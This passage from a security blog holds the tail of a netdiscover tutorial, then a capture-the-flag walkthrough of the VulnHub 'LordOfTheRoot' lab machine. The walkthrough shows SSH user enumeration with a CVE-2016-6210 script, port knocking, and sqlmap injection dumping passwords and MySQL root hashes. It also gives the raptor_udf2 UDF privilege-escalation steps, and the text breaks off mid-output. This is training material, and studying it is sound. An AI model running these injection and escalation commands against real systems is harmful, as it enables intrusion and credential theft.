</span><span class='line'>  -p passive mode: do not send anything, only sniff
</span><span class='line'>  -m file: scan the list of known MACs and host names
</span><span class='line'>  -F filter: Customize pcap filter expression (default: "arp")
</span><span class='line'>  -s time: time to sleep between each arp request (milliseconds)
</span><span class='line'>  -n node: last ip octet used for scanning (from 2 to 253)
</span><span class='line'>  -c count: number of times to send each arp reques (for nets with packet loss)
</span><span class='line'>  -f enable fastmode scan, saves a lot of time, recommended for auto
</span><span class='line'>  -d ignore home config files for autoscan and fast mode
</span><span class='line'>  -S enable sleep time supression between each request (hardcore mode)
</span><span class='line'>  -P print results in a format suitable for parsing by another program
</span><span class='line'>  -N Do not print header. Only valid when -P is enabled.
</span><span class='line'>  -L in parsable output mode (-P), continue listening after the active scan is completed
</span><span class='line'>
</span><span class='line'>If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.</span></code></pre></td></tr></table></div></figure>


<h2>Netdiscover usage</h2>

<p>Simply typing netdiscover at the terminal will launch its autoscan. The screen is interactive, and you can see new hosts as they appear.</p>

<ul>
<li>scan range</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover -r 192.168.217.0/24
</span><span class='line'>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                      
</span><span class='line'>                                                                                                                                                    
</span><span class='line'> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                    
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor     </span></code></pre></td></tr></table></div></figure>


<ul>
<li>passive scan (don&rsquo;t send anything, just sniff)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover -p
</span><span class='line'> Currently scanning: (passive)   |   Screen View: Unique Hosts                                                                                      
</span><span class='line'>                                                                                                                                                    
</span><span class='line'> 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                    
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor                                                                                   
</span><span class='line'> 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor      </span></code></pre></td></tr></table></div></figure>


<p>This takes longer, because netdiscover is waiting to see the ARP requests and replies between other hosts</p>

<ul>
<li>fast scan</li>
</ul>


<blockquote><p>-f     Enable  fast  mode  scan. This will only scan for .1, .100 and .254 on each network. This mode is useful while
searching for ranges being used. After you found such range you can make a specific range scan to find online boxes.</p></blockquote>

<ul>
<li>produce parseable output and stop after scanning</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 192.168.217.0/24 -P
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor
</span><span class='line'> 192.168.217.138 00:0c:29:43:d4:3e      1      60  Unknown vendor
</span><span class='line'> 192.168.217.254 00:50:56:f2:e2:e6      1      60  Unknown vendor
</span><span class='line'>
</span><span class='line'>-- Active scan completed, 4 Hosts found.</span></code></pre></td></tr></table></div></figure>


<p>Cookie:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_____________________________________
</span><span class='line'>/ F.S. Fitzgerald to Hemingway:        \
</span><span class='line'>|                                      |
</span><span class='line'>| "Ernest, the rich are different from |
</span><span class='line'>| us." Hemingway:                      |
</span><span class='line'>|                                      |
</span><span class='line'>\ "Yes. They have more money."         /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root/"/>
    <updated>2017-06-12T11:08:37-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/12/bow-before-the-lord-of-the-root</id>
    <content type="html"><![CDATA[<p>Back to looking through VulnHub&rsquo;s selection of virtual machines, I got hooked by the name of this one. The author intended for this machine to be similar in difficulty to those in the OSCP lab, so it&rsquo;s definitely good training if you&rsquo;re preparing to jump into the fray!</p>

<!-- more -->


<p>The port scan revealed only 1 open port:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span></code></pre></td></tr></table></div></figure>


<p>I also ran a UDP scan, but got nothing. I proceeded to google the SSH version, and got a hit quite fast. It appears that this OpenSSH version is vulnerable to <a href="https://www.ubuntu.com/usn/usn-3061-1/">CVE-2016-6210</a>, which allows users to be enumerated.</p>

<p>Luckily for us, there is an <a href="https://www.exploit-db.com/exploits/40136/">exploit</a> available.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -h
</span><span class='line'>usage: 40136.py [-h] [-u USER | -U USERLIST] [-e] [-s] [--bytes BYTES]
</span><span class='line'>                [--samples SAMPLES] [--factor FACTOR] [--trials TRIALS]
</span><span class='line'>                host
</span><span class='line'>
</span><span class='line'>positional arguments:
</span><span class='line'>  host                  Give SSH server address like ip:port or just by ip
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -u USER, --user USER  Give a single user name
</span><span class='line'>  -U USERLIST, --userlist USERLIST
</span><span class='line'>                        Give a file containing a list of users
</span><span class='line'>  -e, --enumerated      Only show enumerated users
</span><span class='line'>  -s, --silent          Like -e, but just the user names will be written to
</span><span class='line'>                        stdout (no banner, no anything)
</span><span class='line'>  --bytes BYTES         Send so many BYTES to the SSH daemon as a password
</span><span class='line'>  --samples SAMPLES     Collect so many SAMPLES to calculate a timing baseline
</span><span class='line'>                        for authenticating non-existing users
</span><span class='line'>  --factor FACTOR       Used to compute the upper timing boundary for user
</span><span class='line'>                        enumeration
</span><span class='line'>  --trials TRIALS       try to authenticate user X for TRIALS times and
</span><span class='line'>                        compare the mean of auth timings against the timing
</span><span class='line'>                        boundary</span></code></pre></td></tr></table></div></figure>


<p>So you have to give the script a username or a list of users to enumerate. Well, we already know one user! If you glanced at the LordOfTheRoot VM after it booted, you probably noticed good old smeagol:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/smeagol.png" title="smeagol" alt="smeagol"></p>

<p>Ran the script with the smeagol username:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python 40136.py -u smeagol 192.168.217.136
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>User name enumeration against SSH daemons affected by CVE-2016-6210
</span><span class='line'>Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>[*] Testing SSHD at: 192.168.217.136:22, Banner: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3
</span><span class='line'>[*] Getting baseline timing for authenticating non-existing users............
</span><span class='line'>[*] Baseline mean for host 192.168.217.136 is 0.0507569 seconds.
</span><span class='line'>[*] Baseline variation for host 192.168.217.136 is 0.0110011491622 seconds.
</span><span class='line'>[*] Defining timing of x &lt; 0.0837603474867 as non-existing user.
</span><span class='line'>[*] Testing your users...
</span><span class='line'>[+] smeagol - timing: 0.425467</span></code></pre></td></tr></table></div></figure>


<p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH&#8217;ing into the box to see what happens:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh smeagol@192.168.217.136
</span><span class='line'>The authenticity of host '192.168.217.136 (192.168.217.136)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.217.136' (ECDSA) to the list of known hosts.
</span><span class='line'>
</span><span class='line'>                                                  .____    _____________________________
</span><span class='line'>                                                  |    |   \_____  \__    ___/\______   \
</span><span class='line'>                                                  |    |    /   |   \|    |    |       _/
</span><span class='line'>                                                  |    |___/    |    \    |    |    |   \
</span><span class='line'>                                                  |_______ \_______  /____|    |____|_  /
</span><span class='line'>                                                          \/       \/                 \/
</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
</span><span class='line'>|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
</span><span class='line'>|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
</span><span class='line'>|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
</span><span class='line'>|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
</span><span class='line'>        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
</span><span class='line'>Easy as 1,2,3
</span><span class='line'>smeagol@192.168.217.136's password: </span></code></pre></td></tr></table></div></figure>


<p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -r -p1,2,3 192.168.217.136
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-12 12:31 EDT
</span><span class='line'>Nmap scan report for 192.168.217.136
</span><span class='line'>Host is up (0.00065s latency).
</span><span class='line'>PORT  STATE    SERVICE
</span><span class='line'>1/tcp filtered tcpmux
</span><span class='line'>2/tcp filtered compressnet
</span><span class='line'>3/tcp filtered compressnet</span></code></pre></td></tr></table></div></figure>


<p>The <code>-r</code> option was necessary to scan the ports in consecutive order. After knocking, I ran the full Nmap scan again, and a web server now awaited me:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>


<p>I checked it out in the browser, and found this image:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/willdo.jpeg" title="mordor" alt="take the ring to mordor"></p>

<p>Ran exiftool and strings on the picture, didn&rsquo;t find anything. Next I went to the <em>/images</em> directory where the image was served from, and found 2 more. Downloaded them and put them through exiftool and strings, still no results. In the meantime, I had also fired up a directory bruteforce on the server, but that didn&rsquo;t get me anywhere either. So the next thing I tried was to see if there is a directory called smeagol on the web server. There wasn&rsquo;t, but I was presented this picture, one of the 3 images found:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/hipster.jpg" title="hipster" alt="hipster"></p>

<p>Further testing confirmed that this image acted as a 404 page. But when I looked at the source, I found a suspicious string in a comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span></code></pre></td></tr></table></div></figure>


<p>I put the string into a <a href="https://encoder.mattiasgeniar.be/index.php">multipurpose online decoder</a> and got a base64 string out of it: <code>Lzk3ODM0NTIxMC9pbmRleC5waHA=</code>. Decoding it revealed a directory on the web server: <code>/978345210/index.php</code>. Going there, I found a login page!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/mordor.png" title="mordor" alt="mordor login"></p>

<p>Time for sqlmap! I had to play with it and tweak quite a bit, the default levels didn&rsquo;t report any injection vulnerability, and the scan took so long, I had to break the enumeration into manageable pieces:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" --current-db</span></code></pre></td></tr></table></div></figure>


<p>First, I queried for the current DB in use. I also turned on all the optimizaton switches, raised testing levels, and started with the username parameter. And luckily, it was vulnerable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>current database:    'Webapp'</span></code></pre></td></tr></table></div></figure>


<p>Next, I dumped the discovered database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.136:1337/978345210/index.php" --method POST -o --level=5 --risk=3 --dbms=MySQL -p username --data="username=smeagol&password=precious&submit=+Login+" -D Webapp --dump
</span><span class='line'>[...]
</span><span class='line'>Database: Webapp
</span><span class='line'>Table: Users
</span><span class='line'>[5 entries]
</span><span class='line'>+----+----------+------------------+
</span><span class='line'>| id | username | password         |
</span><span class='line'>+----+----------+------------------+
</span><span class='line'>| 1  | frodo    | iwilltakethering |
</span><span class='line'>| 2  | smeagol  | MyPreciousR00t   |
</span><span class='line'>| 3  | aragorn  | AndMySword       |
</span><span class='line'>| 4  | legolas  | AndMyBow         |
</span><span class='line'>| 5  | gimli    | AndMyAxe         |
</span><span class='line'>+----+----------+------------------+</span></code></pre></td></tr></table></div></figure>


<p>Now that I had usernames and passwords, it was time to test them on SSH! I started with smeagol, because it looked slightly different than the others :&ndash;) And I got in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ uname -a
</span><span class='line'>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>So, especially for older machines, one of the first things I do is check the kernel version. Googling it actually yielded a <a href="https://www.exploit-db.com/exploits/39166/">privilege escalation exploit</a> right away. I decided to save this approach for last, because the exploit wasn&rsquo;t known at the time of the VM release. Instead, I proceeded to some more conventional enumeration.</p>

<p>I downloaded my <a href="https://github.com/chousensha/linux_privcheck">linux_privcheck</a> tool with <code>wget <a href="https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py">https://raw.githubusercontent.com/chousensha/linux_privcheck/master/privinfo.py</a></code> and ran it on the machine while I ate a lasagna. Then I combed through the output (note to self: I have to revisit my script and make improvements to it, will get to it). The interesting tidbits that I observed were:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root      1174     1  0 08:15 ?        00:00:08 /usr/sbin/mysqld</span></code></pre></td></tr></table></div></figure>


<p>MySQL running as root! Definitely on to something there, as we could get root credentials from SQLi. The other thing I found were some setuid binaries in a suspicious folder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/SECRET/door2/file
</span><span class='line'>/SECRET/door1/file
</span><span class='line'>/SECRET/door3/file</span></code></pre></td></tr></table></div></figure>


<p>The machine description on VulnHub stated that there are 2 methods for gaining privilege escalation..and here we are with 2 possible venues of attack! Let&rsquo;s take them in order!</p>

<h2>Privilege escalation method #1 &ndash; via MySQL</h2>

<p>With MySQL running as root, we can use <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">a UDF and a setuid binary to gain a root shell</a>. At the core of this exploit is the fact that a User Defined Function can be evaluated as SQL code to run commands in the context of the MySQL process, which is root in this case. As I was reading through the article, it became clear that root credentials would be needed for the database server. So I went back to sqlmap, and this time added the switches <code>&mdash;users</code> and <code>&mdash;passwords</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>database management system users [5]:
</span><span class='line'>[*] 'debian-sys-maint'@'localhost'
</span><span class='line'>[*] 'root'@'127.0.0.1'
</span><span class='line'>[*] 'root'@'::1'
</span><span class='line'>[*] 'root'@'localhost'
</span><span class='line'>[*] 'root'@'lordoftheroot'
</span><span class='line'>
</span><span class='line'>database management system users password hashes:
</span><span class='line'>[*] debian-sys-maint [1]:
</span><span class='line'>    password hash: *A55A9B9049F69BC2768C9284615361DFBD580B34
</span><span class='line'>[*] root [1]:
</span><span class='line'>    password hash: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F</span></code></pre></td></tr></table></div></figure>


<p>I used an online cracker for the root hash, and the cracked password was <em>darkshadow</em>. Then I connected to the MySQL database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:~$ mysql -u root -p 
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 1829
</span><span class='line'>Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Next, I followed the steps of the <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">infamoussyn article</a>, which are really well explained. UDF files need to be <a href="https://dev.mysql.com/doc/refman/5.7/en/udf-compiling.html">locally compiled and installed on the server host</a>, and a special directory is required for that..</p>

<ul>
<li>Find the location where MySQL looks for shared object files, identified by the <code>plugin_dir</code> variable:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show variables like "plugin_dir";
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>| Variable_name | Value                  |
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>| plugin_dir    | /usr/lib/mysql/plugin/ |
</span><span class='line'>+---------------+------------------------+
</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>The required directory is found at <code>/usr/lib/mysql/plugin/</code>. This is where we&rsquo;ll put our UDF object files.</p>

<ul>
<li>Now it&rsquo;s time to compile the object file. The exploit that allows privilege escalation is called<a href="https://www.exploit-db.com/exploits/1518/">raptor_udf2.c</a>. I downloaded it to the compromised machine, and followed the instructions in the source code to compile it:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -c raptor_udf2.c</span></code></pre></td></tr></table></div></figure>


<p>If you are lost in the myriad of GCC options from its manpage, there is a cool page offering <a href="https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html">options summary</a> in a way that lets you jump to whatever interests you. Here, I compiled the C file without linking, and with debugging information. This produced an object file called <code>raptor_udf2.o</code>.</p>

<ul>
<li>Next, you create a shared library and link it:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></code></pre></td></tr></table></div></figure>


<p>If you copy from the source code, you have to change the 1 in <em>-W1</em> to a lowercase l, otherwise you get an error. Here&rsquo;s a <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">good resource</a> to help you untangle the above command. Now you should also have in your directory a shared object called <code>raptor_udf2.so</code>.</p>

<ul>
<li>Now you create a table inside MySQL and insert the shared object contents. Switch to the mysql DB:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; use mysql;
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed</span></code></pre></td></tr></table></div></figure>


<p>Create table:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create table foo(line blob);
</span><span class='line'>Query OK, 0 rows affected (0.03 sec)</span></code></pre></td></tr></table></div></figure>


<p>Load your .so file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
</span><span class='line'>Query OK, 1 row affected (0.01 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Copy the .so file to the plugin directory:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
</span><span class='line'>Query OK, 1 row affected (0.05 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Now you can create the UDF:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
</span><span class='line'>Query OK, 0 rows affected (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; select * from mysql.func;
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>| name      | ret | dl             | type     |
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>| do_system |   2 | raptor_udf2.so | function |
</span><span class='line'>+-----------+-----+----------------+----------+
</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Confirm that it works:</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select do_system('id &gt; /tmp/out; chown smeagol.smeagol /tmp/out');
</span><span class='line'>+------------------------------------------------------------+
